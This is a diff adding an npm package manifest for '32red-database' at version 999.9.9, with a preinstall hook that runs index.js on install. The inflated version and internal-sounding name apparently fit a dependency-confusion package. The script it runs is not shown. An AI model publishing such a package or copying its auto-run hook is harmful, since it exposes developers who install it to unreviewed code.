@@ -1,0 +1,11 @@
+{
+  "name": "32red-database",
+  "version": "999.9.9",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "MIT"
+}
